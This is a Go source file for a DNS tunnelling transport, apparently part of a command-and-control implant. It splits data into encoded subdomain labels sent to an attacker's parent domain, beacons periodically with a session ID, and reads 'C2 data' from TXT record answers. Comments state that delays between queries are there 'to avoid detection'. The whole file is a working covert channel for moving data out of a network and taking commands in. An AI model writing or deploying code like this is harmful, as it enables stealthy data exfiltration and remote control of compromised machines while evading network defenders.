package dns

import (
	"context"
	"encoding/binary"
	"errors"
	"fmt"
	"math/rand"
	"net"
	"strings"
	"sync"
	"time"
)

var (
	ErrNotConnected = errors.New("not connected")
	ErrClosed       = errors.New("transport closed")
)

// Transport implements the Transport interface over DNS queries,
// supporting multiple record types (TXT, A, AAAA, CNAME), chunked
// data transfer, and a configurable resolver.
type Transport struct {
	mu           sync.Mutex
	parentDomain string
	resolvers    []string // DNS resolver addresses
	recordTypes  []string // record types to use for sending
	sessionID    [8]byte
	recvBuf      chan []byte
	closed       bool
	connected    bool
	cancelFunc   context.CancelFunc

	// Chunking.
	maxLabelLen int // max bytes per subdomain label
	maxLabels   int // max number of data labels per query

	// Timing.
	queryInterval time.Duration
	txID          uint16
}

// Config holds the configuration for the DNS transport.
type Config struct {
	ParentDomain  string
	Resolvers     []string
	RecordTypes   []string
	SessionID     [8]byte
	QueryInterval time.Duration
	MaxLabelLen   int
	MaxLabels     int
}

// New creates a new DNS transport.
func New(cfg Config) (*Transport, error) {
	if cfg.ParentDomain == "" {
		return nil, fmt.Errorf("parent domain is required")
	}

	resolvers := cfg.Resolvers
	if len(resolvers) == 0 {
		resolvers = []string{"8.8.8.8:53"}
	}

	recordTypes := cfg.RecordTypes
	if len(recordTypes) == 0 {
		recordTypes = []string{"TXT", "A"}
	}

	maxLabelLen := cfg.MaxLabelLen
	if maxLabelLen == 0 {
		maxLabelLen = 30 // base32-safe label length
	}

	maxLabels := cfg.MaxLabels
	if maxLabels == 0 {
		maxLabels = 3
	}

	queryInterval := cfg.QueryInterval
	if queryInterval == 0 {
		queryInterval = 2 * time.Second
	}

	return &Transport{
		parentDomain:  cfg.ParentDomain,
		resolvers:     resolvers,
		recordTypes:   recordTypes,
		sessionID:     cfg.SessionID,
		recvBuf:       make(chan []byte, 64),
		maxLabelLen:   maxLabelLen,
		maxLabels:     maxLabels,
		queryInterval: queryInterval,
	}, nil
}

// Connect starts the DNS transport.
func (t *Transport) Connect(ctx context.Context) error {
	t.mu.Lock()
	if t.closed {
		t.mu.Unlock()
		return ErrClosed
	}
	t.connected = true
	t.mu.Unlock()

	ctx, cancel := context.WithCancel(ctx)
	t.mu.Lock()
	t.cancelFunc = cancel
	t.mu.Unlock()

	go t.recvLoop(ctx)
	return nil
}

// Send encodes data into DNS queries using subdomain encoding.
func (t *Transport) Send(data []byte) error {
	t.mu.Lock()
	if !t.connected || t.closed {
		t.mu.Unlock()
		return ErrNotConnected
	}
	t.mu.Unlock()

	// Prepend session ID to the data.
	payload := make([]byte, len(t.sessionID)+len(data))
	copy(payload, t.sessionID[:])
	copy(payload[len(t.sessionID):], data)

	// Chunk and encode the payload into DNS queries.
	chunks := ChunkData(payload, t.maxLabelLen*t.maxLabels)

	for i, chunk := range chunks {
		encoded := EncodeChunk(chunk, uint16(i), uint16(len(chunks)))
		labels := splitIntoLabels(encoded, t.maxLabelLen)
		subdomain := strings.Join(labels, ".")
		qname := subdomain + "." + t.parentDomain

		if err := t.sendQuery(qname); err != nil {
			return fmt.Errorf("sending DNS query chunk %d/%d: %w", i+1, len(chunks), err)
		}

		// Small delay between chunks to avoid detection.
		if i < len(chunks)-1 {
			time.Sleep(t.queryInterval / 2)
		}
	}

	return nil
}

// Recv receives data extracted from DNS responses.
func (t *Transport) Recv() ([]byte, error) {
	data, ok := <-t.recvBuf
	if !ok {
		return nil, ErrClosed
	}
	return data, nil
}

// Close shuts down the DNS transport.
func (t *Transport) Close() error {
	t.mu.Lock()
	defer t.mu.Unlock()

	t.closed = true
	t.connected = false
	if t.cancelFunc != nil {
		t.cancelFunc()
	}
	close(t.recvBuf)
	return nil
}

// Name returns the transport name.
func (t *Transport) Name() string {
	return "dns"
}

// sendQuery sends a DNS query and extracts data from the response.
func (t *Transport) sendQuery(qname string) error {
	t.mu.Lock()
	t.txID++
	txID := t.txID
	t.mu.Unlock()

	resolver := t.resolvers[rand.Intn(len(t.resolvers))]
	recordType := t.recordTypes[rand.Intn(len(t.recordTypes))]

	msg := buildDNSQuery(txID, qname, dnsQType(recordType))

	conn, err := net.DialTimeout("udp", resolver, 5*time.Second)
	if err != nil {
		return fmt.Errorf("dialing resolver %s: %w", resolver, err)
	}
	defer conn.Close()

	conn.SetDeadline(time.Now().Add(10 * time.Second))

	if _, err := conn.Write(msg); err != nil {
		return fmt.Errorf("writing DNS query: %w", err)
	}

	buf := make([]byte, 4096)
	n, err := conn.Read(buf)
	if err != nil {
		return fmt.Errorf("reading DNS response: %w", err)
	}

	// Extract any data from the response.
	responseData := extractResponseData(buf[:n])
	if len(responseData) > 0 {
		select {
		case t.recvBuf <- responseData:
		default:
		}
	}

	return nil
}

// recvLoop periodically sends check-in queries and receives responses.
func (t *Transport) recvLoop(ctx context.Context) {
	ticker := time.NewTicker(t.queryInterval)
	defer ticker.Stop()

	for {
		select {
		case <-ctx.Done():
			return
		case <-ticker.C:
			// Send a check-in query with just the session ID.
			payload := make([]byte, len(t.sessionID))
			copy(payload, t.sessionID[:])

			encoded := EncodeChunk(payload, 0, 1)
			labels := splitIntoLabels(encoded, t.maxLabelLen)
			subdomain := strings.Join(labels, ".")
			qname := subdomain + "." + t.parentDomain

			t.sendQuery(qname)
		}
	}
}

// splitIntoLabels splits an encoded string into DNS-safe labels.
func splitIntoLabels(encoded string, maxLen int) []string {
	var labels []string
	for len(encoded) > 0 {
		end := maxLen
		if end > len(encoded) {
			end = len(encoded)
		}
		labels = append(labels, encoded[:end])
		encoded = encoded[end:]
	}
	return labels
}

// dnsQType converts a record type string to a DNS question type.
func dnsQType(recordType string) uint16 {
	switch strings.ToUpper(recordType) {
	case "A":
		return 1
	case "AAAA":
		return 28
	case "TXT":
		return 16
	case "CNAME":
		return 5
	default:
		return 1
	}
}

// buildDNSQuery constructs a minimal DNS query message.
func buildDNSQuery(txID uint16, qname string, qtype uint16) []byte {
	msg := make([]byte, 0, 512)

	// Transaction ID.
	id := make([]byte, 2)
	binary.BigEndian.PutUint16(id, txID)
	msg = append(msg, id...)

	// Flags: standard query, recursion desired.
	msg = append(msg, 0x01, 0x00)
	// QDCOUNT=1.
	msg = append(msg, 0, 1)
	// ANCOUNT=0.
	msg = append(msg, 0, 0)
	// NSCOUNT=0.
	msg = append(msg, 0, 0)
	// ARCOUNT=0.
	msg = append(msg, 0, 0)

	// Question: encode qname.
	for _, label := range strings.Split(qname, ".") {
		if label == "" {
			continue
		}
		msg = append(msg, byte(len(label)))
		msg = append(msg, []byte(label)...)
	}
	msg = append(msg, 0) // null terminator

	// QTYPE.
	qt := make([]byte, 2)
	binary.BigEndian.PutUint16(qt, qtype)
	msg = append(msg, qt...)
	// QCLASS IN.
	msg = append(msg, 0, 1)

	return msg
}

// extractResponseData extracts C2 data from a DNS response.
// It looks for TXT records containing base32-encoded data.
func extractResponseData(response []byte) []byte {
	if len(response) < 12 {
		return nil
	}

	// Parse the header.
	anCount := binary.BigEndian.Uint16(response[6:8])
	if anCount == 0 {
		return nil
	}

	// Skip past the header and question section.
	offset := 12
	// Skip question name.
	for offset < len(response) {
		length := int(response[offset])
		if length == 0 {
			offset++ // null terminator
			break
		}
		if response[offset]&0xc0 == 0xc0 {
			offset += 2 // pointer
			break
		}
		offset += 1 + length
	}
	offset += 4 // skip QTYPE and QCLASS

	// Parse answer records.
	for i := uint16(0); i < anCount && offset < len(response); i++ {
		// Skip name (handle pointers).
		if offset >= len(response) {
			break
		}
		if response[offset]&0xc0 == 0xc0 {
			offset += 2
		} else {
			for offset < len(response) {
				length := int(response[offset])
				if length == 0 {
					offset++
					break
				}
				offset += 1 + length
			}
		}

		if offset+10 > len(response) {
			break
		}

		rtype := binary.BigEndian.Uint16(response[offset : offset+2])
		offset += 2 // type
		offset += 2 // class
		offset += 4 // TTL
		rdLength := int(binary.BigEndian.Uint16(response[offset : offset+2]))
		offset += 2

		if offset+rdLength > len(response) {
			break
		}

		if rtype == 16 && rdLength > 1 { // TXT record
			txtLen := int(response[offset])
			if txtLen > 0 && offset+1+txtLen <= offset+rdLength {
				txtData := response[offset+1 : offset+1+txtLen]
				decoded := DecodeChunkData(string(txtData))
				if len(decoded) > 0 {
					return decoded
				}
			}
		}

		offset += rdLength
	}

	return nil
}
